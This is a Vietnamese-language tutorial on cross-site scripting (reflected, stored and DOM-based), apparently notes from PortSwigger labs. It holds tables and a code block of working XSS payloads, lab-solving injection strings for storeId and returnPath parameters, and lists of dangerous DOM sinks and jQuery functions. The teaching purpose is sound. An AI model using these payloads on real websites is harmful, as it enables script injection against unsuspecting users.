# Reflected XSS
Xảy ra khi mã độc được truyền vào thông qua link hoặc một form hay dễ hiểu hơn là mã độc có nguồn gốc từ request HTTP hiện tại. 
Ví dụ:

![1.1](https://github.com/user-attachments/assets/2c879a31-f87c-45d7-bae6-e529d17065ce)

Phần `name` được nhận trực tiếp từ người dùng và hiển thị ra giao diện sau khi submit.
Ta có thể nhập script `<script>print()</script>` vào thanh search để thực hiện xss.
Lúc này trang web sẽ gọi lệnh `print()` vì lầm tưởng đó là một phần của trang web. 
![1.2](https://github.com/user-attachments/assets/c614cd51-5137-451e-bc02-9a00b167a93e)

# Stored XSS 
Xảy ra khi mã độc được lưu trữ trên máy chủ ví dụ như comment. Khi người dùng truy cập trang web có chứa mã độc đó, script sẽ được thực thi mà ta không hề hay biết.
ví dụ: 

![2.1](https://github.com/user-attachments/assets/386994d3-d04d-4ae5-9401-db982d673dcc)

Ta có thể comment script: <script>print()</script> để trang web lầm tưởng đó là nội dung của nó và thực thi lệnh `print()` mỗi khi ta tải trang web.

![2.2](https://github.com/user-attachments/assets/e391ddd5-5ebd-472e-906c-e36264f7f8d9)


# Một số thủ thuật
Ta có thể thực hiện một cuộc tấn công xss đơn giản với tag `script` nhưng nếu tag bị chặn thì sao? Ta sẽ phải tìm những tag khác để mở ra các hướng khai thác không bị chặn. 
1. Sử dụng cheatsheet để bruteforce các tag và event  
   ![Port-swigger_cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) cung cấp rất nhiều tag và event phổ biến.
Một số các tag và event dễ dẫn tới xss:
## Các thẻ HTML dễ bị XSS

| Thẻ HTML   | Mô tả                            | Ví dụ khai thác XSS |
|------------|----------------------------------|---------------------|
| `<script>` | Chạy JavaScript trực tiếp       | `<script>alert(1)</script>` |
| `<img>`    | Chứa ảnh, hỗ trợ event`onerror`      | `<img src=x onerror=print()>` |
| `<iframe>` | Nhúng trang web khác            | `<iframe src="javascript:print()"></iframe>` |
| `<svg>`    | Hỗ trợ JavaScript bên trong     | `<svg onload=print()>` |
| `<object>` | Nhúng tài liệu hoặc script      | `<object data="javascript:print()"></object>` |
| `<embed>`  | Nhúng nội dung đa phương tiện   | `<embed src="javascript:print()">` |
| `<video>`  | Hỗ trợ event `onerror`        | `<video onerror=print()>` |
| `<audio>`  | Hỗ trợ event `onerror`        | `<audio onerror=print())>` |
| `<body>`   | Chứa nhiều event toàn trang   | `<body onload=print()>` |
| `<link>`   | Load tài nguyên, có thể chạy JS | `<link rel="stylesheet" href="javascript:print()">` |
| `<meta>`   | Chuyển hướng hoặc chạy script   | `<meta http-equiv="refresh" content="0;url=javascript:print()">` |

---

## Các sự kiện JavaScript dễ bị khai thác XSS

| Sự kiện          | Mô tả                        | Ví dụ khai thác XSS |
|-----------------|----------------------------|---------------------|
| `onerror`       | Kích hoạt khi có lỗi        | `<img src=x onerror=print()>` |
| `onload`        | Chạy khi trang/tài nguyên tải xong | `<body onload=print()>` |
| `onclick`       | Kích hoạt khi nhấn chuột    | `<button onclick=alert(1)>Click</button>` |
| `onmouseover`   | Khi di chuột vào phần tử    | `<div onmouseover=print()>Hover me</div>` |
| `onfocus`       | Khi phần tử được focus      | `<input onfocus=print()>` |
| `onblur`        | Khi phần tử mất focus       | `<input onblur=print()>` |
| `onchange`      | Khi giá trị input thay đổi  | `<input onchange=print()>` |
| `oninput`       | Khi nhập dữ liệu vào ô input | `<input oninput=print()>` |
| `onsubmit`      | Khi form được submit        | `<form onsubmit=print()><input type=submit></form>` |
| `onhashchange`  | Khi hash của URL thay đổi  | `window.onhashchange = () => print();` |

---

##  **Ví dụ Payload XSS**
```html
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')"></svg>
<button onclick="alert('XSS')">Click me</button>
<a href="javascript:alert('XSS')">Click</a>
<iframe src="https://example.com/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width='123px'>
```


# DOM-based XSS
### DOM là gì?
Document object model (DOM) giúp trang web truy nhập, thay đổi nội một cách dynamic phần source code của 1 trang web html. Từ đó, nó có thể thay đổi nội dung hiển thị tuỳ vào thao tác của user hoặc cách trang web hoạt động.
Ví dụ về một HTML DOM tree:

![DOM tree](https://github.com/user-attachments/assets/4a7a4dd3-779e-40b2-82e6-e95da06f9505)

Để dễ hiểu hơn ta ví dụ một web example:
```
<html>
  <head>
    <tittle>DOM tree</tittle>
  </head>
  <body>
    <h1>DAT DEP TRY</h1>
    <a href = "https://example.com/">EXAMPLE</a>
  </body>
</html>
```

### DOM-based XSS
Lỗ hổng DOM-based XSS xảy ra khi mã độc được chèn vào trang web bằng cách sử dụng các tài nguyên không được lưu trữ trên máy chủ, mà được tải từ máy chủ và xử lý trên trình duyệt của người dùng.
Ví dụ: 

![3.1](https://github.com/user-attachments/assets/83c55a0a-77ee-44eb-80c3-75b0dc68c0f9)

Dựa vào function của trang web, ta có thể chèn script `"><svg onload=print()>` ('<img src="/resources/images/tracker.gif?searchTerms='"><svg onload=print()>'">').

Một ví dụ khác:

![LAB](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

![image](https://github.com/user-attachments/assets/f469c790-786b-49a2-8a39-d2c63a04233b)

![image](https://github.com/user-attachments/assets/1902795f-1798-4299-b19d-988c7ffcc192)

Dựa vào source code, ta để ý đoạn code 
```
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```
Ta sẽ tạo một stores[i] (storeId) để có thể thực hiện xss. Để ý trong burpsuite, sau khi check tại London sẽ có một url /product/stock có method là POST gửi đi 2 param `productId` và `storeId` nhưng url /product?productId=1 lại không hề xuất hiện param storeId mà vẫn trả về kết quả số sản phẩm. Ta thấy có thể thêm param storeId vào sau productId khi check, ta thêm script sau &storeId=1"><select><img%20src=1%20onerror=print()> vào url là có thể solve.

### DOM XSS trong jQuery
Thư viện jQuery của JavasSriptcó thể chưa rất nhiều lỗ hổng DOM XSS. Ví dụ hàm attr() - dùng để lấy hoặc thiết lập giá trị của một thuộc tính trên một phần tử HTML, ẩn chứa nguy cơ tạo ra lỗ hổng DOM XSS.
![LAB](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink) 

Source code của phần Submit feedback
![image](https://github.com/user-attachments/assets/c3529c95-a278-4f19-a93a-b87b75e23cfa)

Chức năng Back gọi hàm attr() lấy giá trị tham số returnPath trong URL để thiết lập giá trị cho thuộc tính href. 
Ta thêm payload `javascript:<script>alert(1)</script> ` vào sau url /feedback?returnPath= để hoàn thành bài lab.

###Cách sinks có thể dẫn tới xss
- document.write()
- document.writeln()
- document.domain
- element.innerHTML
- element.outerHTML
- element.insertAdjacentHTML
- element.onevent

###Các hàm trong thư viện jQuery có thể dẫn tới xss:
- add()
- after()
- append()
- animate()
- insertAfter()
- insertBefore()
- before()
- html()
- prepend()
- replaceAll()
- replaceWith()
- wrap()
- wrapInner()
- wrapAll()
- has()
- constructor()
- init()
- index()
- jQuery.parseHTML()
- $.parseHTML()
